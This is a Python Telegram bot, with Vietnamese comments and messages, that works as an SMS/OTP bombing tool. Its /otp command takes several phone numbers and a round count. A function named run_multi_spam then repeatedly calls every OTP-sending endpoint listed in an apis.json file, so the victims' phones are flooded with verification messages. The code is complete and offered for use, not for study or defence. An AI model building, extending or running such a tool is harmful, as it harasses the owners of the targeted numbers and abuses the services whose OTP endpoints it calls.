import asyncio
import json
import os
import logging
import requests
from telegram import Update, BotCommand
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Cấu hình Logging
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Lưu trạng thái task theo chat_id và tên task
active_tasks = {}

# --- HÀM TẢI DANH SÁCH API TỪ FILE JSON ---
def load_apis():
    if not os.path.exists("apis.json"):
        return []
    try:
        with open("apis.json", "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Lỗi đọc file apis.json: {e}")
        return []

# Hàm thực thi gửi request tổng quát dựa trên cấu hình trong JSON
def execute_api(api_config, phone):
    try:
        url = api_config["url"].replace("{phone}", phone)
        method = api_config.get("method", "GET").upper()
        
        # Thay thế placeholder {phone} trong headers nếu có
        headers = {}
        for k, v in api_config.get("headers", {}).items():
            headers[k] = v.replace("{phone}", phone)

        # Xử lý Body hoặc Params
        if method == "GET":
            params = {}
            for k, v in api_config.get("params", {}).items():
                params[k] = v.replace("{phone}", phone)
            requests.get(url, headers=headers, params=params, timeout=5)
            
        elif method == "POST":
            body_type = api_config.get("body_type", "json")
            template = api_config.get("body_template", {})
            
            # Thay thế giá trị {phone} trong template
            payload = {}
            for k, v in template.items():
                if isinstance(v, str):
                    payload[k] = v.replace("{phone}", phone)
                else:
                    payload[k] = v

            if body_type == "json":
                requests.post(url, headers=headers, json=payload, timeout=5)
            elif body_type == "data":
                requests.post(url, headers=headers, data=payload, timeout=5)
    except Exception:
        pass

# --- XỬ LÝ LỆNH TELEGRAM ---

async def set_bot_commands(application):
    commands = [
        BotCommand("start", "Bắt đầu sử dụng bot và xem hướng dẫn"),
        BotCommand("otp", "Gửi OTP cho nhiều SĐT với tên tiến trình"),
        BotCommand("stop", "Dừng tiến trình theo tên định danh"),
        BotCommand("help", "Xem hướng dẫn sử dụng bot")
    ]
    await application.bot.set_my_commands(commands)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    apis = load_apis()
    welcome_text = (
        "👋 **Chào mừng bạn đến với Bot quản lý tiến trình OTP!**\n\n"
        f"📊 Tổng số API hiện đang cấu hình: `{len(apis)}`\n\n"
        "1️⃣ **Lệnh `/otp` (Hỗ trợ chạy nhiều số điện thoại):**\n"
        "• Cú pháp: `/otp <sđt_1,sđt_2,...> <tên_tiến_trình> <số_lần>`\n"
        "• Ví dụ: `/otp 0912345678,0987654321 task1 3`\n\n"
        "2️⃣ **Lệnh `/stop` (Dừng tiến trình theo tên):**\n"
        "• Cú pháp: `/stop <tên_tiến_trình>`\n"
        "• Ví dụ: `/stop task1`\n\n"
        "3️⃣ **Lệnh `/help`:**\n"
        "• Xem lại bảng hướng dẫn bất cứ lúc nào."
    )
    await update.message.reply_text(welcome_text, parse_mode="Markdown")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    apis = load_apis()
    help_text = (
        "🤖 **HƯỚNG DẪN SỬ DỤNG BOT**\n\n"
        f"📊 Số lượng API sẵn sàng: `{len(apis)}`\n\n"
        "1️⃣ **Lệnh `/otp` (Hỗ trợ nhiều số điện thoại):**\n"
        "• Cú pháp: `/otp <sđt_1,sđt_2,...> <tên_tiến_trình> <số_lần>`\n"
        "• Ví dụ: `/otp 0912345678,0987654321 task1 3`\n\n"
        "2️⃣ **Lệnh `/stop` (Dừng theo tên):**\n"
        "• Cú pháp: `/stop <tên_tiến_trình>`\n"
        "• Ví dụ: `/stop task1`"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    apis = load_apis()
    
    if not apis:
        await update.message.reply_text("⚠️ File `apis.json` đang trống hoặc không tồn tại!")
        return
    
    if len(context.args) < 3:
        await update.message.reply_text(
            "⚠️ **Cách dùng:** `/otp <sđt_1,sđt_2,...> <tên_tiến_trình> <số_lần>`\n"
            "Ví dụ: `/otp 0912345678,0987654321 task1 3`", 
            parse_mode="Markdown"
        )
        return

    phones_raw = context.args[0]
    task_name = context.args[1]
    
    try:
        rounds = int(context.args[2])
    except ValueError:
        await update.message.reply_text("⚠️ Số lần chạy phải là một số nguyên!")
        return

    phones = [p.strip() for p in phones_raw.split(',') if p.strip()]
    if not phones:
        await update.message.reply_text("⚠️ Vui lòng nhập ít nhất một số điện thoại hợp lệ!")
        return

    if chat_id not in active_tasks:
        active_tasks[chat_id] = {}

    if task_name in active_tasks[chat_id] and not active_tasks[chat_id][task_name].done():
        await update.message.reply_text(f"⚠️ Tiến trình với tên `{task_name}` đang chạy. Hãy dùng `/stop {task_name}` trước!")
        return

    await update.message.reply_text(
        f"🚀 Bắt đầu tiến trình `{task_name}` cho **{len(phones)}** số điện thoại với `{len(apis)}` API | Số vòng: `{rounds}`", 
        parse_mode="Markdown"
    )

    task = asyncio.create_task(run_multi_spam(chat_id, phones, apis, task_name, rounds, update))
    active_tasks[chat_id][task_name] = task

async def run_multi_spam(chat_id, phones, apis, task_name, rounds, update):
    try:
        total_sent = 0
        for i in range(rounds):
            await asyncio.sleep(0.1)
            for phone in phones:
                for api_config in apis:
                    await asyncio.get_event_loop().run_in_executor(None, execute_api, api_config, phone)
                    total_sent += 1
                    await asyncio.sleep(0.1)
                
        await update.message.reply_text(f"✅ Tiến trình `{task_name}` đã hoàn thành! Đã gửi tổng cộng khoảng {total_sent} yêu cầu.", parse_mode="Markdown")
    except asyncio.CancelledError:
        await update.message.reply_text(f"⏹️ Tiến trình `{task_name}` đã bị dừng lại thành công.")
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi ở tiến trình `{task_name}`: {str(e)}")
    finally:
        if chat_id in active_tasks and task_name in active_tasks[chat_id]:
            del active_tasks[chat_id][task_name]

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    if not context.args:
        if chat_id in active_tasks and active_tasks[chat_id]:
            running_names = list(active_tasks[chat_id].keys())
            await update.message.reply_text(f"⚠️ Vui lòng nhập tên tiến trình cần dừng.\nCác tiến trình đang chạy: `{', '.join(running_names)}`", parse_mode="Markdown")
        else:
            await update.message.reply_text("ℹ️ Hiện không có tiến trình nào đang chạy.")
        return

    task_name = context.args[0]
    
    if chat_id in active_tasks and task_name in active_tasks[chat_id] and not active_tasks[chat_id][task_name].done():
        active_tasks[chat_id][task_name].cancel()
        await update.message.reply_text(f"⏹️ Đang tiến hành dừng tiến trình `{task_name}`...", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"ℹ️ Không tìm thấy tiến trình nào đang chạy với tên `{task_name}`.")

def main():
    TOKEN = "YOUR_BOT_TOKEN"  # Thay token của bạn vào đây
    
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("otp", otp_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("help", help_command))

    app.post_init = set_bot_commands

    print("🤖 Bot đang chạy với hệ thống đọc API động từ JSON...")
    app.run_polling()

if __name__ == "__main__":
    main()